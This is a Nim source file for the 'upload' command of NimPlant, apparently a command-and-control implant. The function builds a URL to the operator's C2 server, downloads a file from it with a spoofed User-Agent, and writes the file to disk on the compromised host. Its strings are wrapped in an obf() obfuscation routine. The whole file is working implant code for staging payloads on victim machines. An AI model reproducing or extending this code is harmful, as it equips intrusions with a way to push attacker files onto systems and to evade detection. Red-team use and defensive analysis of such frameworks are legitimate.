import puppy
from strutils import join, split, toLowerAscii
from os import getcurrentdir, `/`
from ../util/webClient import Listener

# Upload a file from the C2 server to NimPlant
# From NimPlant's perspective this is similar to wget, but calling to the C2 server instead
proc upload*(li : Listener, args : varargs[string]) : string =
    var 
        fileId : string
        fileName : string
        filePath : string
        url : string
        res : string

    if args.len == 2 and args[0] != "" and args[1] != "":
        fileId = args[0]
        fileName = args[1]
        filePath = getCurrentDir()/fileName
    elif args.len >= 3:
        fileId = args[0]
        fileName = args[1]
        filePath = args[2 .. ^1].join(obf(" "))
    else:
        # Handling of the second argument (filename) is done by the python server
        result = obf("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.")
        return
    
    url = toLowerAscii(li.listenerType) & obf("://")
    if li.listenerHost != "":
        url = url & li.listenerHost
    else:
        url = url & li.listenerIp & obf(":") & li.listenerPort
    url = url & li.taskpath & obf("/") & fileId & obf("?id=") & li.id

    # Get the file - Puppy will take care of transparent gzip deflation
    res = fetch(
            url,
            headers = @[Header(key: obf("User-Agent"), value: li.userAgent)]
            )
    
    if res == "":
        result = obf("Something went wrong uploading the file (NimPlant did not receive response from staging server '") & url & obf("').")
        return
    else:
        filePath.writeFile(res)
        result = obf("Uploaded file to '") & filePath & obf("'.")